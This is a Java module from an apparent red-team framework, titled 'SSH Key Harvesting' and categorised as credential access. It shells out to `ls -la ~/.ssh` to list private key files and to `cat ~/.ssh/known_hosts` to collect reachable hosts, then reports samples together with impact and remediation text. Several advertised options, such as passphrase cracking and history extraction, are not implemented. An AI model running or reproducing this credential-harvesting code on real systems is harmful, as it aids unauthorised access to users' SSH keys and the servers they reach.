package com.jabber.jrts.modules.credential;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="cred-ssh",name="SSH Key Harvesting",description="Extract private SSH keys and known_hosts files",category=Category.CREDENTIAL_ACCESS,riskLevel=RiskLevel.HIGH,sourceRef="SSHKey",author="JRTS")
public class SSHKeyHarvestModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("key_type","Key Type",List.of("rsa","ed25519","ecdsa","dsa","all")).required().group("Target"),
            ModuleInputField.text("username","Target User").placeholder("current_user").group("Target"),
            ModuleInputField.text("ssh_dir","SSH Directory").placeholder("~/.ssh").group("Advanced"),
            ModuleInputField.checkbox("extract_known_hosts","Extract known_hosts").group("Data"),
            ModuleInputField.checkbox("extract_config","Extract SSH Config").group("Data"),
            ModuleInputField.checkbox("extract_history","Extract SSH History").group("Data"),
            ModuleInputField.checkbox("crack_passphrases","Crack Passphrases").group("Options"),
            ModuleInputField.text("advanced","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"cred-ssh");
            try{
                String keyType=input.getOrDefault("key_type","all");

                ctx.log("[*] SSH Key Harvesting Starting...");
                ctx.log("[*] Key Type: "+keyType);
                ctx.reportProgress(15);

                List<String>keys=new ArrayList<>();
                List<String>knownHosts=new ArrayList<>();

                keys=harvestPrivateKeys(keyType);
                knownHosts=harvestKnownHosts();

                if(keys.isEmpty()&&knownHosts.isEmpty()){
                    result.fail("No SSH artifacts found");return result;
                }
                ctx.log("[+] Found "+keys.size()+" private keys");
                ctx.log("[+] Found "+knownHosts.size()+" known hosts");
                ctx.reportProgress(75);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("key_type",keyType);
                findings.put("private_keys_found",keys.size());
                findings.put("known_hosts_found",knownHosts.size());
                findings.put("key_sample",keys.size()>0?keys.get(0).substring(0,50):"none");
                findings.put("known_hosts_sample",knownHosts.size()>0?String.join("|",knownHosts.stream().limit(3).toList()):"none");
                findings.put("impact","Private SSH keys enable password-less authentication to remote servers");
                findings.put("remediation","Protect .ssh directory (700), use key passphrases, rotate keys regularly, monitor key access");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private List<String> harvestPrivateKeys(String keyType){
        List<String>keys=new ArrayList<>();
        try{
            String home=System.getProperty("user.home");
            String sshDir=home+"/.ssh";
            Process p=Runtime.getRuntime().exec(new String[]{"ls","-la",sshDir});
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if((keyType.equals("all")||line.contains(keyType))&&(line.contains("id_")||line.contains("key"))){
                    keys.add(line);
                }
            }
            s.close();
        }catch(Exception e){}
        return keys;
    }

    private List<String> harvestKnownHosts(){
        List<String>hosts=new ArrayList<>();
        try{
            String home=System.getProperty("user.home");
            Process p=Runtime.getRuntime().exec(new String[]{"cat",home+"/.ssh/known_hosts"});
            Scanner s=new Scanner(p.getInputStream());
            int count=0;
            while(s.hasNextLine()&&count<10){
                hosts.add(s.nextLine());
                count++;
            }
            s.close();
        }catch(Exception e){}
        return hosts;
    }
}
